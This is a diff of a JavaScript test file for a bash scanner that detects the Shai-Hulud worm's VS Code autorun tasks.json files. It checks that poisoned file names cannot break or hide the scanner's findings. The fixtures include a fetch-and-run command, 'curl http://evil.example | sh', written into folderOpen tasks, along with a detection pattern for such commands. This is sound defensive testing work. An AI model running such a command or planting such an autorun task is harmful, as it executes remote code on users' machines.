@@ -1,13 +1,82 @@
 'use strict';
 
 // Behavioural (black-box) tests for scripts/scan-shai-hulud-may2026.sh's report
-// integrity (SCAN-01, G-1549, phase 19 plan 19-04).
+// integrity (SCAN-01/SCAN-02, G-1549, phase 19 plans 19-04 and 19-06).
 //
 // This scanner has 4 of the phase's 7 counted `printf "%b"` sites: the
 // fail()/reprint path (site ~589), the two hit-list print sites at ~350
-// (shell-rc section) and ~377 (shell-history section), and the SCAN-02
-// control-flow loop at ~190 (FOLDEROPEN_FILES) -- that fourth site is NOT
-// this plan's; it is fixed separately by 19-06-PLAN.md.
+// (shell-rc section) and ~377 (shell-history section) -- all three closed by
+// 19-04-PLAN.md -- and the SCAN-02 control-flow loop (FOLDEROPEN_FILES),
+// closed by THIS plan (19-06-PLAN.md, D-11/D-12): the accumulator is deleted
+// (not hardened), triage moves inline into the enumeration loop, and the
+// `find` feeding it is converted to `-print0`/`read -r -d ''`.
+//
+// --- SCAN-02 test-vehicle corrections (Rule 1), empirically verified by
+// running BOTH the real, unmodified pre-fix script AND a scratch copy with
+// this plan's exact fix applied, against several throwaway HOME fixtures,
+// before writing any assertion -- matching this repo's established
+// precedent (19-01/19-04's own header-comment corrections) ------------------
+//
+// 1. THE REAL-NEWLINE VEHICLE'S FAILURE MODE IS SILENT DROP, NOT A REPORTED
+//    PHANTOM. Pre-fix, Section 2's FIRST loop (`done < <(find ... 2>/dev/null)`,
+//    newline-delimited) is what splits a real-LF-poisoned path into two
+//    fragments -- BEFORE the FOLDEROPEN_FILES accumulator or its `%b`
+//    re-parse ever run. Each fragment then fails the loop's OWN
+//    `grep -l '"runOn"...' "$f"` gate (the fragment is not a real file), so
+//    the `if` body is skipped entirely -- NEITHER fragment is ever added to
+//    FOLDEROPEN_FILES, and NEITHER ever reaches a print helper. The poisoned
+//    file is simply never mentioned anywhere in the report (verified:
+//    exactly 2 `[FAIL]` lines for 3 worm-pattern files, zero phantom lines).
+//    A "neither fragment appears as a standalone reported path" assertion
+//    against THIS vehicle is therefore true in every state tested (pre-fix,
+//    delimiter-only-reverted, and the full two-loop-`%b` shape reverted) --
+//    it cannot fail here, because this vehicle's bug never produces a
+//    phantom REPORT, only a silent drop. The finding-count assertion (3
+//    expected vs. the observed lower count) is what actually proves this
+//    vehicle's fail-open; a phantom-report assertion is NOT attached to it.
+//
+// 2. THE PHANTOM-FRAGMENT ASSERTION IS MOVED TO THE LITERAL-BACKSLASH-N
+//    VEHICLE, where it genuinely discriminates. Pre-fix, a literal 2-char
+//    backslash-n in the path survives the FIRST loop intact (no real
+//    newline, so `read -r` reads the whole record in one line) and gets
+//    added to FOLDEROPEN_FILES correctly. The SPLIT happens one loop later,
+//    inside the SECOND loop's `printf "%b" "$FOLDEROPEN_FILES"` re-parse,
+//    which interprets the embedded backslash-n the same as the
+//    accumulator's own intentional record separators. Critically, the
+//    SECOND loop has NO existence gate (unlike the first loop's `grep -l`
+//    check) -- it unconditionally falls to the `info()` branch for a
+//    fragment whose `grep -oE` extraction comes up empty (silently, via
+//    `2>/dev/null`), REGARDLESS of whether the fragment is a real file. This
+//    is why the literal-backslash-n vehicle produces two REAL, visible
+//    phantom `[INFO]` lines pre-fix (empirically confirmed: fragment paths
+//    literally appear in the live report), while the real-newline vehicle
+//    produces none. Post-fix, with the `%b` re-parse deleted entirely, this
+//    vehicle also proves the corollary must-still-pass property: a literal
+//    backslash-n is no longer escape-processed by anything, so the poisoned
+//    path survives complete through its final `tasks.json` segment.
+//
+// 3. HOSTILE-CONTENT (R2-7) CASE SCOPED TO THE FINDING_LOG REPRINT, NOT
+//    WHOLE STDOUT. A real ESC embedded in the `"command"` VALUE (matched by
+//    WORM_CMD_RE on the same grep line) DOES reach raw stdout even after
+//    this plan's fix -- empirically confirmed against the fixed scratch
+//    script -- because it travels through the `printf "%s\n" "$bad_cmds" |
+//    sed ...` "Matched commands:"/"Commands (review...)" dump, a direct,
+//    un-helpered pipe this plan's <action> text explicitly excludes ("one of
+//    the 22 direct content-print sites... deferred to 19-10-PLAN.md", same
+//    class as 19-04-SUMMARY.md's info()-path finding). A whole-stdout
+//    zero-ESC claim on this vehicle would therefore fail for an out-of-scope
+//    reason. `fail()`/`info()` only ever receive the tasks.json PATH as
+//    their argument (never command content, per 19-04's own finding) -- so
+//    the FINDING_LOG reprint (which only ever holds fail()'s sanitized path
+//    argument) is the correctly-scoped place to assert zero raw ESC bytes.
+//    Separately, a real embedded LF inside the command value breaks the
+//    section's own line-based `grep -oE` extraction for THAT record (grep
+//    cannot span an embedded newline), so the hostile-content file correctly
+//    falls to the non-worm `info()` branch rather than matching WORM_CMD_RE
+//    -- verified identical pre-fix and post-fix (this case is a
+//    must-still-pass companion, not independently RED-eligible for SCAN-02;
+//    its purpose per R2-7 is proving hostile CONTENT, unlike a hostile NAME,
+//    reaches the loop's own grep/sed parsing without stopping the loop).
 //
 // This file is also the one real test-environment hazard in the phase:
 // lines ~549-573 fire an UNGATED `gh repo list --limit 200` whenever `gh` is
@@ -201,9 +270,26 @@ function readBashArrayLiteral(varName) {
   return items;
 }
 
+// Section 2 (tasks.json worm-pattern triage, SCAN-02) source extraction --
+// read WORM_CMD_RE out of the script rather than retyping its literals, so
+// this file's WORM_COMMAND fixture cannot silently stop matching if the
+// pattern is ever edited. Bash's ERE `[[:space:]]` POSIX bracket expression
+// has no native JS RegExp equivalent -- unlike bash, `new RegExp('[[:space:]]')`
+// in JS parses as a character class containing the literal characters
+// `:space` followed by a literal `]`, not "any whitespace" -- so it must be
+// translated to `\s` before construction, or every case using this pattern
+// throws ERR_ASSERTION for an unrelated (tooling, not scanner) reason.
+function readWormCmdRe() {
+  const src = fs.readFileSync(SCRIPT, 'utf8');
+  const m = src.match(/WORM_CMD_RE='([^']+)'/);
+  assert.ok(m, 'could not extract WORM_CMD_RE from scripts/scan-shai-hulud-may2026.sh');
+  return m[1].split('[[:space:]]').join('\\s');
+}
+
 const HEREDOC_PATTERN = readHeredocPattern();
 const RC_BAD_PATTERNS = readBashArrayLiteral('RC_BAD_PATTERNS');
 const HIST_PATTERNS = readBashArrayLiteral('HIST_PATTERNS');
+const WORM_CMD_RE_TEXT = readWormCmdRe();
 
 // Non-vacuity: assert the specific literals this file's fixtures depend on
 // are still present in the extracted sets, BEFORE using them.
@@ -227,6 +313,14 @@ const HEREDOC_CANDIDATE = buildMatchingLine(HEREDOC_PATTERN, '<<ABCDEFGH1');
 const WORM_COMMAND = 'curl http://evil.example | sh';
 const BENIGN_COMMAND = 'npm run dev';
 
+// Non-vacuity: assert WORM_COMMAND still matches the pattern extracted
+// straight from the script's own source, rather than trusting the literal
+// above to stay in sync by hand.
+assert.ok(
+  new RegExp(WORM_CMD_RE_TEXT, 'i').test(WORM_COMMAND),
+  `WORM_COMMAND "${WORM_COMMAND}" no longer matches the extracted WORM_CMD_RE pattern /${WORM_CMD_RE_TEXT}/ -- fixture drifted from the script`
+);
+
 function tasksJsonContent(command) {
   return JSON.stringify(
     { version: '2.0.0', tasks: [{ label: 'x', type: 'shell', command, runOptions: { runOn: 'folderOpen' } }] },
@@ -247,6 +341,25 @@ function buildTasksJsonUnder(home, dirName, command) {
   fs.mkdirSync(vscodeDir, { recursive: true });
   const tasksPath = path.join(vscodeDir, 'tasks.json');
   fs.writeFileSync(tasksPath, tasksJsonContent(command));
+  return tasksPath;
+}
+
+// Content-hostile counterpart to buildTasksJsonUnder(), for the R2-7
+// hostile-CONTENT case: builds the tasks.json body BY HAND rather than via
+// JSON.stringify (tasksJsonContent() above), because JSON.stringify escapes
+// real control bytes in a JS string into  / \n form -- which would
+// defeat the whole point of a raw-byte content vehicle. dirName stays plain
+// (never hostile) so only the command VALUE carries hostile bytes, keeping
+// this a pure content-vs-name test per review R2-7.
+function buildTasksJsonUnderRaw(home, dirName, rawCommand) {
+  const parent = path.join(home, SHAI_HULUD_ROOT, 'x');
+  fs.mkdirSync(parent, { recursive: true });
+  const leafDir = writeHostileDir(parent, dirName);
+  const vscodeDir = path.join(leafDir, '.vscode');
+  fs.mkdirSync(vscodeDir, { recursive: true });
+  const tasksPath = path.join(vscodeDir, 'tasks.json');
+  const content = `{"version":"2.0.0","tasks":[{"label":"x","type":"shell","command":"${rawCommand}","runOptions":{"runOn":"folderOpen"}}]}`;
+  fs.writeFileSync(tasksPath, content);
   return tasksPath;
 }
 
@@ -307,6 +420,20 @@ function extractRcHitBlock(stdout) {
 
 function extractHistHitBlock(stdout) {
   return extractSectionHitBlock(stdout, 'Beacon strings in');
+}
+
+// Every path Section 2's live [FAIL]/[INFO] tasks.json lines carry, in
+// report order (SCAN-02). Distinct from countFailLines()/reprintLines(),
+// which only see the FAIL side -- the SECOND loop's pre-fix `%b` re-parse
+// phantom fragments only ever surface via the INFO branch (see this file's
+// header comment, correction #2), so a phantom check needs the INFO lines
+// too, not just the FINDING_LOG reprint.
+function tasksJsonLivePaths(stdout) {
+  const re = /^ {2}\[(?:FAIL|INFO)\] tasks\.json (?:runOn:folderOpen with worm-pattern command|has runOn:folderOpen but commands look legitimate) — (.+)$/gm;
+  const paths = [];
+  let m;
+  while ((m = re.exec(stdout)) !== null) paths.push(m[1]);
+  return paths;
 }
 
 describe('scan-shai-hulud-may2026.sh -- report integrity, fail()/reprint + both hit-list sites (SCAN-01, G-1549)', { skip: !hasBash ? 'bash unavailable' : false }, () => {
@@ -496,10 +623,116 @@ describe('scan-shai-hulud-may2026.sh -- report integrity, fail()/reprint + both 
   });
 });
 
-describe('shai-hulud source-level guard: printf "%b" occurrence count (4 pre-fix, 1 post-fix naming FOLDEROPEN_FILES)', () => {
+describe('scan-shai-hulud-may2026.sh -- SCAN-02: tasks.json enumeration examines every file after a poisoned path (D-11/D-12, G-1549)', { skip: !hasBash ? 'bash unavailable' : false }, () => {
+  const built = [];
+  after(() => built.forEach((h) => fs.rmSync(h, { recursive: true, force: true })));
+
+  it('a real-newline-poisoned path does not stop the loop from examining the files discovered after it: three worm-pattern files report exactly 3 findings, and every real path -- including the poisoned one, sanitized -- is present (see this file\'s header comment, correction #1, on why the phantom-fragment assertion is NOT attached to this vehicle)', () => {
+    const home = newHome(built, () => {});
+    const earlyPath = buildTasksJsonUnder(home, 'lf-early', WORM_COMMAND);
+    const poisonedPath = buildTasksJsonUnder(home, `lf-mid-${HOSTILE_NAMES.LF}-evil`, WORM_COMMAND);
+    const latePath = buildTasksJsonUnder(home, 'lf-late', WORM_COMMAND);
+    const { res } = run(built, home);
+    assert.equal(res.status, 1, res.stdout);
+
+    // Positive controls BEFORE any negative assertion.
+    assert.ok(res.stdout.includes(earlyPath), `missing early control ${earlyPath}\n${res.stdout}`);
+    assert.ok(res.stdout.includes(latePath), `missing late control ${latePath}\n${res.stdout}`);
+
+    const failCount = countFailLines(res.stdout);
+    const reprintCount = countReprintLines(res.stdout);
+    assert.equal(failCount, 3, `expected exactly 3 live [FAIL] lines -- the pre-fix scanner silently drops the poisoned file's own record instead of reporting it (see header comment correction #1), found ${failCount}\n${res.stdout}`);
+    assert.equal(reprintCount, 3, `expected exactly 3 "  - " reprint lines, found ${reprintCount}\n${res.stdout}`);
+
+    const sanitizedPoisoned = poisonedPath.replace(HOSTILE_NAMES.LF, '�');
+    assert.ok(res.stdout.includes(sanitizedPoisoned), `missing the sanitized poisoned path in full\nexpected substring: ${JSON.stringify(sanitizedPoisoned)}\n${res.stdout}`);
+  });
+
+  it('the %b-re-parse half of the defect: a path carrying a literal two-character backslash-n still reports exactly 3 findings, and the poisoned path is reported as ONE complete line -- never split into two phantom fragments (see header comment correction #2)', () => {
+    const home = newHome(built, () => {});
+    const earlyPath = buildTasksJsonUnder(home, 'bsn-early', WORM_COMMAND);
+    const poisonedPath = buildTasksJsonUnder(home, `bsn-mid-${HOSTILE_NAMES.BS_N}-evil`, WORM_COMMAND);
+    const latePath = buildTasksJsonUnder(home, 'bsn-late', WORM_COMMAND);
+    const { res } = run(built, home);
+    assert.equal(res.status, 1, res.stdout);
+
+    assert.ok(res.stdout.includes(earlyPath), `missing early control ${earlyPath}\n${res.stdout}`);
+    assert.ok(res.stdout.includes(latePath), `missing late control ${latePath}\n${res.stdout}`);
+
+    const failCount = countFailLines(res.stdout);
+    const reprintCount = countReprintLines(res.stdout);
+    assert.equal(failCount, 3, `expected exactly 3 live [FAIL] lines, found ${failCount}\n${res.stdout}`);
+    assert.equal(reprintCount, 3, `expected exactly 3 "  - " reprint lines, found ${reprintCount}\n${res.stdout}`);
+
+    const livePaths = tasksJsonLivePaths(res.stdout);
+    assert.ok(livePaths.includes(poisonedPath), `poisoned path not reported as one complete live path (truncated or corrupted by a %b re-parse)\nlive paths: ${JSON.stringify(livePaths)}\n${res.stdout}`);
+
+    // No phantom path assertion (this file's header comment, correction #2):
+    // pre-fix, the %b re-parse splits the poisoned record into two
+    // fragments that the SECOND loop's ungated info() fallback reports
+    // individually. Neither fragment may appear as its own standalone
+    // reported path.
+    const [fragPrefix, fragSuffix] = poisonedPath.split(HOSTILE_NAMES.BS_N);
+    assert.ok(!livePaths.includes(fragPrefix), `phantom prefix fragment reported as a standalone path\nfragment: ${JSON.stringify(fragPrefix)}\nlive paths: ${JSON.stringify(livePaths)}`);
+    assert.ok(!livePaths.includes(fragSuffix), `phantom suffix fragment reported as a standalone path\nfragment: ${JSON.stringify(fragSuffix)}\nlive paths: ${JSON.stringify(livePaths)}`);
+  });
+
+  it('INFO branch: a real-newline-poisoned path with benign (non-worm) commands still reports all 3 tasks.json files, no FAIL, exit 0, and the poisoned path (sanitized) is present', () => {
+    const home = newHome(built, () => {});
+    const earlyPath = buildTasksJsonUnder(home, 'info-early', BENIGN_COMMAND);
+    const poisonedPath = buildTasksJsonUnder(home, `info-mid-${HOSTILE_NAMES.LF}-evil`, BENIGN_COMMAND);
+    const latePath = buildTasksJsonUnder(home, 'info-late', BENIGN_COMMAND);
+    const { res } = run(built, home);
+    assert.equal(res.status, 0, res.stdout); // benign (non-worm) commands only -> no FAIL anywhere
+
+    assert.ok(res.stdout.includes(earlyPath), `missing early control ${earlyPath}\n${res.stdout}`);
+    assert.ok(res.stdout.includes(latePath), `missing late control ${latePath}\n${res.stdout}`);
+    const infoCount = (res.stdout.match(/^ {2}\[INFO\] tasks\.json has runOn:folderOpen but commands look legitimate/gm) || []).length;
+    assert.equal(infoCount, 3, `expected exactly 3 [INFO] tasks.json lines -- the pre-fix scanner silently drops the poisoned file's record instead of reporting it, found ${infoCount}\n${res.stdout}`);
+    const sanitizedPoisoned = poisonedPath.replace(HOSTILE_NAMES.LF, '�');
+    assert.ok(res.stdout.includes(sanitizedPoisoned), `missing the sanitized poisoned path in full\nexpected substring: ${JSON.stringify(sanitizedPoisoned)}\n${res.stdout}`);
+  });
+
+  it('zero-files pass branch survives the restructure: a search root with no tasks.json still prints the PASS line', () => {
+    const home = newHome(built, (h) => {
+      fs.mkdirSync(path.join(h, SHAI_HULUD_ROOT), { recursive: true });
+    });
+    const { res } = run(built, home);
+    assert.equal(res.status, 0, res.stdout);
+    assert.ok(res.stdout.includes('No tasks.json files with runOn:folderOpen found'), res.stdout);
+    assert.ok(/\[PASS\] No tasks\.json files with runOn:folderOpen found/.test(res.stdout), res.stdout);
+  });
+
+  it('hostile CONTENT (review R2-7): a "command" VALUE carrying a real ESC and a real LF does not stop the loop from examining every file -- both benign-content controls still FAIL, the hostile-content file is still triaged (not silently dropped), and the sanitized Findings: reprint block carries zero raw ESC bytes (see header comment correction #3)', () => {
+    const home = newHome(built, () => {});
+    const earlyPath = buildTasksJsonUnder(home, 'content-early', WORM_COMMAND);
+    const hostileCommand = `curl http://evil.example ${HOSTILE_NAMES.ESC}${HOSTILE_NAMES.LF}| sh`;
+    const hostilePath = buildTasksJsonUnderRaw(home, 'content-hostile', hostileCommand);
+    const latePath = buildTasksJsonUnder(home, 'content-late', WORM_COMMAND);
+    const { res } = run(built, home);
+    assert.equal(res.status, 1, res.stdout);
+
+    assert.ok(res.stdout.includes(earlyPath), `missing early control ${earlyPath}\n${res.stdout}`);
+    assert.ok(res.stdout.includes(latePath), `missing late control ${latePath}\n${res.stdout}`);
+
+    const failCount = countFailLines(res.stdout);
+    assert.equal(failCount, 2, `expected exactly 2 [FAIL] lines (the two benign-content controls) -- the hostile-content file's own grep -oE extraction cannot span the embedded real LF (grep is line-based), so it correctly falls to the non-worm INFO branch instead of matching WORM_CMD_RE, found ${failCount}\n${res.stdout}`);
+
+    // Hostile CONTENT must not stop the loop from EXAMINING the file
+    // (D-11/D-12's completion guarantee) -- proven by its path appearing.
+    assert.ok(res.stdout.includes(hostilePath), `hostile-content file was silently dropped, never appears in the report at all\n${res.stdout}`);
+    assert.ok(res.stdout.includes('tasks.json has runOn:folderOpen but commands look legitimate'), res.stdout);
+
+    const reprintBlock = extractFindingsBlock(res.stdout);
+    assert.ok(!Buffer.from(reprintBlock, 'utf8').includes(0x1b), `raw ESC (0x1B) byte reached the Findings: reprint block\n${JSON.stringify(reprintBlock)}`);
+  });
+});
+
+describe('shai-hulud source-level guard: printf "%b" fully removed, FOLDEROPEN_FILES deleted, tasks.json enumeration NUL-delimited (SCAN-02, D-11/D-12, G-1549)', () => {
   // Runs without a hasBash guard -- reading source text needs no bash.
-  it('exactly 4 occurrences pre-fix, or exactly 1 post-fix and that survivor mentions FOLDEROPEN_FILES (the SCAN-02 control loop, fixed separately by 19-06-PLAN.md)', () => {
-    const src = fs.readFileSync(SCRIPT, 'utf8');
+  const src = fs.readFileSync(SCRIPT, 'utf8');
+
+  it('zero printf "%b" occurrences remain anywhere in the file (the last survivor, the SCAN-02 FOLDEROPEN_FILES control loop landed by 19-04-PLAN.md, is deleted by this plan per D-11)', () => {
     const re = /printf "%b"/g;
     const occurrences = [];
     let m;
@@ -508,15 +741,18 @@ describe('shai-hulud source-level guard: printf "%b" occurrence count (4 pre-fix
       const lineEnd = src.indexOf('\n', m.index);
       occurrences.push(src.slice(lineStart, lineEnd === -1 ? src.length : lineEnd));
     }
-    assert.ok(occurrences.length > 0, 'extraction produced ZERO printf "%b" occurrences -- the regex or the file is broken, not "every site is already fixed"');
-    if (occurrences.length > 1) {
-      assert.equal(occurrences.length, 4, `expected exactly 4 printf "%b" occurrences pre-fix, found ${occurrences.length}: ${JSON.stringify(occurrences)}`);
-    } else {
-      assert.equal(occurrences.length, 1, `expected exactly 1 printf "%b" occurrence post-fix, found ${occurrences.length}: ${JSON.stringify(occurrences)}`);
-      assert.ok(
-        occurrences[0].includes('FOLDEROPEN_FILES'),
-        `the single remaining printf "%b" occurrence must be the SCAN-02 control loop (FOLDEROPEN_FILES), found instead: ${JSON.stringify(occurrences[0])}`
-      );
-    }
+    assert.equal(occurrences.length, 0, `expected zero printf "%b" occurrences post-19-06-fix, found ${occurrences.length}: ${JSON.stringify(occurrences)}`);
+  });
+
+  it('the FOLDEROPEN_FILES identifier does not appear anywhere in the file (D-11: the accumulator is deleted, not merely emptied or hardened)', () => {
+    assert.ok(!src.includes('FOLDEROPEN_FILES'), 'FOLDEROPEN_FILES identifier still present in the file');
+  });
+
+  it('the tasks.json enumeration (Section 2) is NUL-delimited: `find` carries -print0 and its `read` uses an empty-string -d delimiter, in the same section (D-12)', () => {
+    const sectionMatch = src.match(/# 2\. VSCode autorun task IOC[\s\S]*?(?=\n# =+\n# 3\.)/);
+    assert.ok(sectionMatch, 'could not extract Section 2 (VSCode autorun task IOC) from the script -- section header text drifted, fix the extraction regex before trusting this guard');
+    const section = sectionMatch[0];
+    assert.ok(/-print0/.test(section), `expected a -print0 flag on the tasks.json find in Section 2\n${section}`);
+    assert.ok(/read\s+-r\s+-d\s+''/.test(section), `expected a read -r -d '' (empty-string delimiter) in Section 2\n${section}`);
   });
 });
